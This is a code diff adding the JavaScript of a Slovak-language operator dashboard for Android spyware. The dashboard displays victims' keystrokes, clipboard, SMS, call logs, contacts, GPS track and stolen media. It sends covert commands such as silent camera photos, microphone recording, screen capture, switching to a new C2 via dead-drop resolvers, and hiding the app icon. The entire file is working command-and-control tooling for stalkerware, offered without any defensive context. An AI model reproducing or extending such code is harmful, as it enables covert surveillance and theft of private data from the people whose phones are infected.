+  $('avatar').textContent = (dev.model||'?').slice(0,2).toUpperCase();
+  $('devName').textContent = dev.model || S.device;
+  $('devSub').textContent = `${S.device} · ${meta.release?('Android '+meta.release):'Android ?'} · videli pred ${fmtAgo(dev.last_seen)}`;
+  const pill=$('livePill');
+  pill.className = 'pill ' + (online?'live':'off');
+  pill.innerHTML = `<span class="dot ${online?'on':'off'}"></span> ${online?'online':'offline'}`;
+
+  const events = Object.entries(c).sort((a,b)=>b[1]-a[1]);
+  const total = events.reduce((s,[,n])=>s+n,0);
+  const keylog = (c.keylog||0)+(c.clipboard||0);
+  $('tiles').innerHTML = `
+    <div class="card tile"><div class="k">${icon('heartbeat')} Stav</div>
+      <div class="v" style="color:${online?'var(--ok)':'var(--bad)'}">${online?'Online':'Offline'}</div>
+      <div class="s">${fmtAgo(dev.last_seen)}</div></div>
+    <div class="card tile"><div class="k">${icon('default')} Udalosti</div>
+      <div class="v">${total}</div><div class="s">celkovo uložených</div></div>
+    <div class="card tile"><div class="k">${icon('keylog')} Keylog / clipboard</div>
+      <div class="v">${keylog}</div><div class="s">zachytených záznamov</div></div>
+    <div class="card tile"><div class="k">${icon('default')} Batéria</div>
+      <div class="v">${(meta.battery!=null&&meta.battery>=0)?meta.battery+'%':'—'}</div>
+      <div class="s">${esc(dev.model||'—')}</div></div>
+    <div class="card tile"><div class="k">${icon('location')} Posledná poloha</div>
+      <div class="v" style="font-size:19px">${loc.lat?loc.lat.toFixed(4)+', '+loc.lon.toFixed(4):'—'}</div>
+      <div class="s">${loc.ts?fmtAgo(loc.ts)+' · '+(loc.source||'gps'):'zatiaľ bez fixu'}</div></div>`;
+
+  const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=18')||[];
+  $('tlHint').textContent = logs.length+' záznamov';
+  $('timeline').innerHTML = logs.length ? logs.map(l=>{
+    const o=parsePayload(l.payload);
+    const extra = pickText(o,['text','msg','body','title','app','package','lat','reason','err']) || l.payload;
+    return `<li><span class="ic">${icon(l.kind.replace('beacon:',''))}</span>
+      <span class="tx"><b>${kindTag(l.kind)}</b> <span class="val">${esc(String(extra).slice(0,180))}</span>
+        ${o?'':`<em> · ${esc(l.payload.slice(0,110))}</em>`}</span>
+      <span class="tm">${fmtT(l.ts)}</span></li>`;
+  }).join('') : '<div class="empty">Zatiaľ žiadne udalosti.</div>';
+
+  $('profile').innerHTML = `
+    <dt>ID</dt><dd class="mono">${esc(dev.device_id||'')}</dd>
+    <dt>Model</dt><dd>${esc(dev.model||'—')}</dd>
+    <dt>Android</dt><dd>${meta.release?meta.release:'—'} (SDK ${meta.sdk||'?'})</dd>
+    <dt>Aplikácia</dt><dd>${meta.app||'—'}</dd>
+    <dt>Root</dt><dd>${meta.rooted===undefined?'—':(meta.rooted?'áno':'nie')}</dd>
+    <dt>Prvý kontakt</dt><dd>${fmtT(dev.first_seen)}</dd>
+    <dt>Posledný kontakt</dt><dd>${fmtT(dev.last_seen)}</dd>
+    <dt>Súbory</dt><dd>${d.files||0}</dd>
+    <dt>Typy dát</dt><dd>${events.map(([k,n])=>`<span class="tag">${esc(k)} ${n}</span>`).join(' ')||'—'}</dd>`;
+
+  drawMini(loc);
+}
+
+/* ---------- location ---------- */
+async function loadLocation(){
+  if(!S.device) return;
+  const track = await j('/api/track/'+encodeURIComponent(S.device))||[];
+  $('locHint').textContent = track.length+' fixov';
+  $('locRows').innerHTML = track.length ? track.map(t=>`<tr>
+      <td class="mono">${fmtT(t.ts)}</td>
+      <td class="mono">${(t.lat??'').toFixed?.(5)??t.lat}, ${(t.lon??'').toFixed?.(5)??t.lon}</td>
+      <td>${t.accuracy!=null?Math.round(t.accuracy)+' m':'—'}</td>
+      <td>${esc(t.source||t.provider||'—')}</td></tr>`).join('')
+    : '<tr><td colspan="4" class="empty">Zatiaľ žiadne polohy. Pošli príkaz <b>loc</b>.</td></tr>';
+  drawMap(track);
+}
+function baseMap(el){
+  const m = L.map(el,{zoomControl:true}).setView([48.1486,17.1077],6);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
+    {attribution:'© OpenStreetMap © CARTO', maxZoom:19}).addTo(m);
+  return m;
+}
+function drawMap(track){
+  if(!S.map){ S.map=baseMap($('map')); }
+  if(S.track){ S.track.remove(); S.track=null; }
+  if(S.mapLayer){ S.mapLayer.remove(); S.mapLayer=null; }
+  if(!track || !track.length){ return; }
+  const pts = track.slice().reverse().map(t=>[t.lat,t.lon]);
+  if(pts.length>1){
+    S.track=L.polyline(pts,{color:'#4f7cff',weight:3,opacity:.9}).addTo(S.map);
+  }
+  const last=track[0];
+  S.mapLayer=L.circleMarker([last.lat,last.lon],{radius:8,color:'#fff',weight:2,fillColor:'#4f7cff',fillOpacity:1})
+    .addTo(S.map).bindPopup(`<b>${esc(S.device)}</b><br>${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}<br>${fmtT(last.ts)}`);
+  S.map.setView([last.lat,last.lon],14);
+  setTimeout(()=>S.map.invalidateSize(),60);
+}
+function drawMini(loc){
+  if(!S.mini){ S.mini=baseMap($('mapMini')); S.miniMini=false; }
+  if(S.miniMark){ S.miniMark.remove(); S.miniMark=null; }
+  if(!loc || !loc.lat) return;
+  S.miniMark=L.circleMarker([loc.lat,loc.lon],{radius:7,color:'#fff',weight:2,fillColor:'#22c55e',fillOpacity:1})
+    .addTo(S.mini).bindPopup(`${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}`);
+  S.mini.setView([loc.lat,loc.lon],12);
+  setTimeout(()=>S.mini.invalidateSize(),60);
+}
+
+/* ---------- log tabs ---------- */
+async function loadKeylog(){
+  if(!S.device) return;
+  const q=$('keySearch').value.trim(), kind=$('keyKind').value;
+  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=300'+qs({q,kind}))||[];
+  const filt = (kind || q) ? rows : rows.filter(r=>/keylog|clipboard|text|key|notification/i.test(r.kind));
+  $('keyHint').textContent = filt.length+' záznamov';
+  $('keyRows').innerHTML = filt.length ? filt.map(r=>{
+    const o=parsePayload(r.payload);
+    const app = pickText(o,['app','package','app_name','source']);
+    const txt = pickText(o,['text','msg','content','body','value']) || r.payload;
+    return `<tr><td class="mono">${fmtT(r.ts)}</td><td>${esc(app||'—')}</td><td>${esc(String(txt).slice(0,400))}</td></tr>`;
+  }).join('') : '<tr><td colspan="3" class="empty">Zatiaľ žiadne záznamy.</td></tr>';
+}
+async function loadMessages(){
+  if(!S.device) return;
+  const q=$('smsSearch').value.trim();
+  const rows=(await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=300'+qs({q}))||[])
+    .filter(r=>/sms|message|notification|inbox/i.test(r.kind));
+  $('smsHint').textContent = rows.length+' správ';
+  $('smsRows').innerHTML = rows.length ? rows.map(r=>{
+    const o=parsePayload(r.payload);
+    const from = pickText(o,['from','sender','address','number','title']);
+    const txt = pickText(o,['text','body','msg','message','content']) || r.payload;
+    return `<tr><td class="mono">${fmtT(r.ts)}</td><td>${esc(from||'—')}</td><td>${esc(String(txt).slice(0,400))}</td></tr>`;
+  }).join('') : '<tr><td colspan="3" class="empty">Zatiaľ žiadne správy.</td></tr>';
+}
+async function loadCalls(){
+  if(!S.device) return;
+  const rows=(await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&kind=call&limit=20')||[]);
+  let calls=[];
+  for(const r of rows){
+    const o=parsePayload(r.payload);
+    if(Array.isArray(o)) calls=calls.concat(o);
+    else if(o&&Array.isArray(o.items)) calls=calls.concat(o.items);
+    else if(o&&typeof o==='object') calls.push(o);
+  }
+  $('callHint').textContent = calls.length+' hovorov';
+  $('callRows').innerHTML = calls.length ? calls.map(c=>{
+    const who = (c.name&&c.name.trim()) ? `${c.name} (${c.number||''})` : (c.number||'—');
+    const dur = c.duration ? (c.duration+' s') : '—';
+    const t = (c.type||'').toUpperCase();
+    const tag = t==='MISSED'?'<span class="tag red">missed</span>':(t==='OUTGOING'?'<span class="tag blue">outgoing</span>':'<span class="tag green">incoming</span>');
+    return `<tr><td class="mono">${c.ts?fmtT(c.ts):'—'}</td><td>${esc(who)}</td>
+      <td>${tag}</td><td class="mono">${esc(dur)}</td></tr>`;
+  }).join('') : '<tr><td colspan="4" class="empty">Zatiaľ žiadne hovory — klikni „História hovorov“.</td></tr>';
+}
+
+async function loadContacts(){
+  if(!S.device) return;
+  const q=$('contactSearch').value.trim().toLowerCase();
+  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&kind=contact&limit=20')||[];
+  let contacts=[];
+  for(const r of rows){
+    const o=parsePayload(r.payload);
+    if(Array.isArray(o)) contacts=contacts.concat(o);
+    else if(o&&Array.isArray(o.items)) contacts=contacts.concat(o.items);
+    else if(o&&typeof o==='object') contacts.push(o);
+  }
+  if(q) contacts = contacts.filter(c=>
+    String(c.name||'').toLowerCase().includes(q) || String(c.number||'').includes(q));
+  $('contactHint').textContent = contacts.length+' kontaktov';
+  $('contactRows').innerHTML = contacts.length ? contacts.map(c=>`<tr>
+      <td>${esc(c.name||'—')}</td><td class="mono">${esc(c.number||'')}</td></tr>`).join('')
+    : '<tr><td colspan="2" class="empty">Kontakty ešte nie sú stiahnuté — klikni „Stiahnuť kontakty“.</td></tr>';
+}
+
+/* ---------- media / files ---------- */
+async function loadFiles(){
+  if(!S.device) return;
+  const files = await j('/api/files?device_id='+encodeURIComponent(S.device))||[];
+  $('fileHint').textContent = files.length+' súborov';
+  $('fileRows').innerHTML = files.length ? files.map(f=>`<tr>
+      <td class="mono">${fmtT(f.ts)}</td><td>${kindTag(f.kind)}</td>
+      <td>${esc(f.filename)}</td><td class="mono">${(f.size/1024).toFixed(1)} KB</td>
+      <td><a class="btn" style="padding:5px 10px" href="/api/file/${f.id}" download>stiahnuť</a></td></tr>`).join('')
+    : '<tr><td colspan="5" class="empty">Zatiaľ žiadne súbory.</td></tr>';
+  const media = files.filter(f=>/photo|image|video|audio|screen|cam|mic|media/i.test(f.kind||'')||/\.(jpe?g|png|webp|gif|mp4|mp3|m4a|webm)$/i.test(f.filename||''));
+  $('mediaHint').textContent = media.length+' položiek';
+  $('gallery').innerHTML = media.length ? media.map(f=>{
+    const isImg=/\.(jpe?g|png|webp|gif)$/i.test(f.filename||'');
+    const isVid=/\.(mp4|webm|mov)$/i.test(f.filename||'');
+    const isAud=/\.(mp3|m4a|ogg|wav|aac)$/i.test(f.filename||'');
+    const inner = isImg? `<img loading="lazy" src="/api/file/${f.id}/preview">`
+      : `<div class="ph">${icon(isVid?'screen':isAud?'mic':'media')}</div>`;
+    return `<div class="gitem" onclick="window.open('/api/file/${f.id}/preview','_blank')">
+      ${inner}<div class="nm"><b>${esc(f.filename)}</b>${esc(f.kind||'')} · ${(f.size/1024).toFixed(0)} KB</div></div>`;
+  }).join('') : '<div class="empty" style="grid-column:1/-1">Zatiaľ žiadne médiá. Pošli príkaz <b>media</b> alebo <b>cam</b>.</div>';
+}
+
+/* ---------- commands ---------- */
+const CMDS = [
+  {k:'ping', t:'Ping', d:'Test spojenia'},
+  {k:'loc', t:'Poloha', d:'Pošli GPS/web fix'},
+  {k:'mic', t:'Mikrofón', d:'nahrať zvuk'},
+  {k:'cam', t:'Foto', d:'tichá snímka'},
+  {k:'screen', t:'Obrazovka', d:'snímka displeja'},
+  {k:'media', t:'Galéria', d:'stiahni fotky/video'},
+  {k:'usage', t:'Aplikácie', d:'štatistiky používania'},
+  {k:'apps', t:'Zoznam aplikácií', d:'nainštalované appky'},
+  {k:'calls', t:'História hovorov', d:'dump call logu'},
+  {k:'contacts', t:'Kontakty', d:'dump kontaktov'},
+  {k:'clipboard', t:'Clipboard', d:'schránka'},
+  {k:'ddr', t:'Nový C2', d:'dead-drop resolvery'},
+  {k:'flush', t:'Flush', d:'vyplachni dáta'},
+  {k:'hide', t:'Skryť ikonu', d:'disable launcher', danger:true},
+  {k:'show', t:'Ukázať ikonu', d:'enable launcher'}
+];
+function renderChips(){
+  $('cmdChips').innerHTML = CMDS.map(c=>`<button class="chip ${c.danger?'danger':''}" onclick="runCmd('${c.k}')">${c.t}</button>`).join('');
+  $('cmdSel').innerHTML = CMDS.map(c=>`<option value="${c.k}">${c.k} — ${c.d}</option>`).join('');
+}
+async function runCmd(cmd){
+  if(!S.device){ toast('Najprv vyber zariadenie', true); return; }
+  let args={};
+  if(cmd==='mic'){ args={sec:15}; }
+  if(cmd==='media'){ args={count:20}; }
+  const r = await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({device_id:S.device, cmd, args})});
+  const d = await r.json();
+  $('cmdMsg').innerHTML = d.ok ? `Odoslané: <b>${esc(cmd)}</b> — zariadenie ho vyzdvihne pri najbližšom poll-e.`
+                              : `<span style="color:var(--bad)">${esc(d.error||'chyba')}</span>`;
+  toast(d.ok?('Príkaz '+cmd+' odoslaný'):('Chyba: '+(d.error||'')), !d.ok);
+  setTimeout(loadCommands, 800);
+}
+async function loadCommands(){
+  if(!S.device) return;
+  const rows = await j('/api/commands?device_id='+encodeURIComponent(S.device))||[];
+  $('cmdRows').innerHTML = rows.length ? rows.map(c=>`<tr>
+      <td class="mono">${c.id}</td><td class="mono">${fmtT(c.created)}</td>
+      <td>${esc(c.cmd)}</td><td class="mono">${esc((c.args||'').slice(0,120))}</td>
+      <td>${c.done?'<span class="tag green">doručené</span>':'<span class="tag amber">čaká</span>'}</td></tr>`).join('')
+    : '<tr><td colspan="5" class="empty">Zatiaľ žiadne príkazy.</td></tr>';
+}
+
+/* ---------- routing ---------- */
+const LOADERS = {overview:loadOverview, location:loadLocation, keylog:loadKeylog,
+  messages:loadMessages, calls:loadCalls, contacts:loadContacts, media:loadFiles,
+  files:loadFiles, commands:loadCommands};
+function go(view){
+  S.view=view;
+  document.querySelectorAll('.nav a').forEach(a=>a.classList.toggle('on', a.dataset.view===view));
+  document.querySelectorAll('.view').forEach(v=>v.classList.toggle('on', v.id==='v-'+view));
+  if(LOADERS[view]) LOADERS[view]();
+  setTimeout(()=>{ if(S.map) S.map.invalidateSize(); if(S.mini) S.mini.invalidateSize(); },60);
+  $('side').classList.remove('open');
+}
+function renderAll(){ const f=LOADERS[S.view]; if(f) f(); loadOverview(); }
+
+/* ---------- boot ---------- */
+document.querySelectorAll('.nav a').forEach(a=>a.addEventListener('click',()=>go(a.dataset.view)));
+$('hamb').addEventListener('click',()=>$('side').classList.toggle('open'));
+$('refreshBtn').addEventListener('click',()=>{ loadDevices(); renderAll(); toast('Obnovené'); });
+$('cmdSend').addEventListener('click',()=>{
+  let raw=$('cmdArgs').value.trim(), args={};
+  if(raw){ try{ args=JSON.parse(raw); }catch(e){ toast('Neplatný JSON', true); return; } }
+  const cmd=$('cmdSel').value;
+  if(!S.device){ toast('Najprv vyber zariadenie', true); return; }
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({device_id:S.device, cmd, args})})
+    .then(r=>r.json()).then(d=>{ toast(d.ok?('Príkaz '+cmd+' odoslaný'):('Chyba: '+(d.error||'')), !d.ok);
+      $('cmdMsg').innerHTML = d.ok?('Odoslané: <b>'+esc(cmd)+'</b>'):''; setTimeout(loadCommands,800); });
+});
+$('keySearch').addEventListener('input',()=>{ clearTimeout(window._t1); window._t1=setTimeout(loadKeylog,350); });
+$('keyKind').addEventListener('change',loadKeylog);
+$('smsSearch').addEventListener('input',()=>{ clearTimeout(window._t2); window._t2=setTimeout(loadMessages,350); });
+$('contactSearch').addEventListener('input',()=>{ clearTimeout(window._t3); window._t3=setTimeout(loadContacts,350); });
+$('globalSearch').addEventListener('input',e=>{
+  const q=e.target.value.trim();
+  if(q){ go('keylog'); $('keySearch').value=q; loadKeylog(); }
+  else if(S.view==='keylog'){ loadKeylog(); }
+});
+renderChips();
+(async function init(){
+  await loadDevices();
+  const saved = localStorage.getItem('sp_device');
+  if(saved && S.devices.some(d=>d.device_id===saved)) S.device=saved;
+  else if(S.devices.length) S.device=S.devices[0].device_id;
+  if(S.device){ localStorage.setItem('sp_device',S.device); await loadDevices(); }
+  renderAll();
+})();
+setInterval(()=>{ loadDevices(); loadOverview(); const p=LOADERS[S.view]; if(p) p(); }, 5000);
+</script>
+</body></html>
